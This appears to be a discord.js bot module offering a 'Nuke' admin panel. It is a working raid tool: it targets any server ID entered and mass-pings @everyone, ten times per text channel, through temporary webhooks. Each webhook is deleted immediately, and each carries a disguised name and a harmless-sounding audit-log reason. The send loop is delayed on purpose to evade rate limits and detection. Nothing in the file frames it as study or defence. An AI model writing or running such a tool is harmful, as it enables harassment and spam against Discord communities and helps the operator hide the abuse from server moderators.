const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType } = require('discord.js');

module.exports = (client) => {
  const ADMIN_SERVER_ID  = '1455924604085473361'; // your admin server
  const ADMIN_CHANNEL_ID = '1455928469434138708'; // your admin channel
  const PREFIX = '?';

  client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (
      message.guild &&
      message.guild.id === ADMIN_SERVER_ID &&
      message.channel.id === ADMIN_CHANNEL_ID &&
      message.content.startsWith(PREFIX)
    ) {
      const args = message.content.slice(PREFIX.length).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      if (command === 'command') {
        message.reply('Admin command triggered! Add your logic here.');
      } else if (command === 'adminpanel') {
        const embed = new EmbedBuilder()
          .setTitle('Admin Panel')
          .setDescription('Use the buttons below to perform admin tasks.')
          .setColor(0xFF4500);

        const button = new ButtonBuilder()
          .setCustomId('nukeButton')
          .setLabel('Nuke 🚀')
          .setStyle(ButtonStyle.Danger);

        const row = new ActionRowBuilder().addComponents(button);

        await message.channel.send({ embeds: [embed], components: [row] });
      } else if (command === 'nuke') {
        message.reply('Use the button in the admin panel instead.');
      } else {
        message.reply(`Unknown admin command: ${command}`);
      }
    }
  });

  // Single interaction handler
  client.on('interactionCreate', async (interaction) => {
    // Button click → show modal
    if (interaction.isButton() && interaction.customId === 'nukeButton') {
      const modal = new ModalBuilder()
        .setCustomId('nukeModal')
        .setTitle('Nuke Setup');

      const serverInput = new TextInputBuilder()
        .setCustomId('serverIdInput')
        .setLabel('Server ID')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setPlaceholder('Enter Server ID');

      const channelInput = new TextInputBuilder()
        .setCustomId('channelIdInput')
        .setLabel('Channel ID (optional)')
        .setStyle(TextInputStyle.Short)
        .setRequired(false)
        .setPlaceholder('Leave empty to affect all channels');

      modal.addComponents(
        new ActionRowBuilder().addComponents(serverInput),
        new ActionRowBuilder().addComponents(channelInput)
      );

      await interaction.showModal(modal);
      return;
    }

    // Modal submit → execute
    if (interaction.type !== InteractionType.ModalSubmit) return;
    if (interaction.customId !== 'nukeModal') return;

    await interaction.deferReply({ ephemeral: true });

    const serverId  = interaction.fields.getTextInputValue('serverIdInput').trim();
    const channelId = interaction.fields.getTextInputValue('channelIdInput').trim();

    try {
      const targetGuild = await client.guilds.fetch(serverId);
      if (!targetGuild) {
        return await interaction.editReply('Server not found.');
      }

      let targetChannels = [];

      if (channelId) {
        let targetChannel;
        try {
          targetChannel = await targetGuild.channels.fetch(channelId);
        } catch {}
        if (!targetChannel || !targetChannel.isTextBased()) {
          return await interaction.editReply('Channel not found or not text-based.');
        }
        targetChannels = [targetChannel];
      } else {
        targetChannels = targetGuild.channels.cache.filter(c =>
          c.isTextBased() &&
          c.permissionsFor(targetGuild.members.me)?.has('SendMessages') &&
          c.permissionsFor(targetGuild.members.me)?.has('ManageWebhooks')  // required to create webhook!
        );
        targetChannels = [...targetChannels.values()];
      }

      if (targetChannels.length === 0) {
        return await interaction.editReply('No suitable channels found (need SendMessages + ManageWebhooks perm).');
      }

      let totalSent = 0;

      for (const channel of targetChannels) {
        for (let i = 0; i < 10; i++) {
          try {
            // Create temp webhook
            const webhook = await channel.createWebhook({
              name: 'Notification Bot',  // change if you want
              avatar: null,              // optional: add URL for fake avatar
              reason: 'Temporary notification'  // shows in audit log
            });

            // Send @everyone via webhook
            await webhook.send({
              content: '@everyone',
              allowedMentions: { parse: ['everyone'] }  // explicitly allow @everyone ping
            });

            totalSent++;

            // Clean up immediately
            await webhook.delete('Cleanup after notification').catch(() => {});

            // Small delay to avoid instant rate-limit / detection
            await new Promise(r => setTimeout(r, 1200));  // ~0.8/sec per channel
          } catch (err) {
            console.log(`Failed in ${channel.id} (loop ${i}):`, err.message);
            // continue anyway
          }
        }
      }

      await interaction.editReply(`Done! Sent **${totalSent}** @everyone pings via temp webhooks.`);
    } catch (error) {
      console.error('Nuke modal error:', error);
      await interaction.editReply('Error during execution.');
    }
  });
};